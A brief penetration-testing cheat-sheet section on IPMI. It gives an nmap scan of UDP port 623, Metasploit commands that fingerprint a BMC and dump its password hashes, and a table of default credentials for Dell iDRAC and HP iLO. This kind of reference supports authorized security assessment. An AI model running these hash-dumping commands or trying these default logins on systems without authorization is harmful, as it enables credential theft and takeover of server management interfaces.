## IPMI

```bash
nmap -sU --script ipmi-version -p 623 $TARGET

msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts $TARGET
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts $TARGET
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```

Default passwords :

| Product    | Username : Password                 |
| ---------- | ----------------------------------- |
| Dell iDRAC | root:calvin                         |
| HP iLO     | administrator (randomized password) |
